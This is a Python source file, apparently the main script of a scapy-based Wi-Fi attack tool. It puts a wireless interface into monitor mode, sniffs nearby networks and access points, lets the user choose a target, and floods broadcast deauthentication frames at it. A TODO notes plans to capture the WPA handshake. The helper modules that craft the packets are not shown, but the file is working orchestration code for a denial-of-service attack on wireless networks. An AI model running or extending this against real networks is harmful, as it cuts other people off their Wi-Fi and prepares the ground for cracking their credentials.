"""
The main file for our program
Requires scapy 2.4.2, installable using `pip3 install scapy`
"""

# The main function that will run on program start
import os
import signal
import subprocess
import sys
import time

from scapy.layers.dot11 import Dot11FCS

# TODO Find out when this is which
# Dot11Type = Dot11
from ap_sniffer import APSniffer
from channel_hopper import ChannelHopper
from deauth_sender import DeauthSender

Dot11Type = Dot11FCS

# Global used variables
networks = []  # All found networks (essids)
sniff_thread = None  # The thread used for sniffing APs
deauth_thread = None  # The thread used for sending out deauth packages
selected_network = None  # The network to attack
selected_ap = None  # The access point to attack


def main():
    global iface, selected_network, selected_ap, deauth_thread

    require_root()

    # Capture CTRL-C
    # signal.signal(signal.SIGINT, catch_exceptions)

    iface = input("Please specify the interface: ")
    set_mon_mode("monitor")

    channel_hopper_thread = ChannelHopper(iface)
    channel_hopper_thread.start()

    selected_network = select_network()
    selected_ap = select_ap()

    print("")
    print("You were going to attack the following network and this specific AP:")
    print(selected_network)
    print(selected_ap)
    print("")

    deauth(selected_ap.bssid, "ff:ff:ff:ff:ff:ff")  # TODO Select victim
    # TODO Capture handshake

    channel_hopper_thread.stop = True
    channel_hopper_thread.join()

    print("Done running, exiting")

    finalize()


# Process for having the user select which Network to attack
def select_network():
    global sniff_thread, networks, iface, Dot11Type

    print("")
    print("Please specify the ID of the Network that you want to attack:")
    sniff_thread = APSniffer(iface, networks, Dot11Type, print_new_networks=True)
    sniff_thread.start()
    network_id = int(input())

    sniff_thread.shutdown = True
    sniff_thread.join()

    # TODO Check for wrong user input
    print("You selected Network ", network_id)
    return networks[network_id]


# Process for having the user select which AP to attack
def select_ap():
    global sniff_thread, iface, networks, Dot11Type, selected_network

    print("")
    print("Please specify the ID of the AP that you want to attack:")
    for ap in selected_network.aps:
        print(ap)
    sniff_thread = APSniffer(iface, networks, Dot11Type, print_new_aps=True, target_network=selected_network)
    sniff_thread.start()
    ap_id = int(input())

    sniff_thread.shutdown = True
    sniff_thread.join()

    # TODO Check for wrong user input
    print("You selected AP ", ap_id)
    return selected_network.aps[ap_id]


# Sends deauth attacks
def deauth(target_network, target_client):
    global iface, deauth_thread

    input("Press enter to start sending deauth")
    deauth_thread = DeauthSender(iface, selected_ap.bssid, target_client)
    deauth_thread.start()
    input("Press enter to stop sending deauth")

    deauth_thread.stop = True
    deauth_thread.join()


# Executed when signal catches an exception (like CTRL+C) during runtime
def catch_exceptions(signal, frame):
    finalize()


# Clean up and shut down
def finalize():
    print_ap_stats()
    set_mon_mode("managed")
    sys.exit(0)


# ---------- UTILITIES ----------

# Prints statistics about the currently captured APs
def print_ap_stats():
    global networks

    print("")
    print("########## STATISTICS ##########")
    print("Total Networks found: %d" % len(networks))
    print("Encrypted Networks  : %d" % len([n for n in networks if n.encrypted]))
    print("Unencrypted Networks: %d" % len([n for n in networks if not n.encrypted]))


# Set the interface in a certain mode. Typically monitor or managed
def set_mon_mode(mode):
    bash_command("ifconfig " + iface + " down")
    bash_command("iwconfig " + iface + " mode " + mode)
    bash_command("ifconfig " + iface + " up")


# Execute a bach command
def bash_command(command):
    command = command.split()
    p = subprocess.Popen(command, stdout=subprocess.PIPE)
    output, err = p.communicate()


# Makes sure the script is ran as root
def require_root():
    if os.getuid() != 0:
        print("Please run the script as root!")
        exit()


# Run the script
if __name__ == '__main__':
    main()
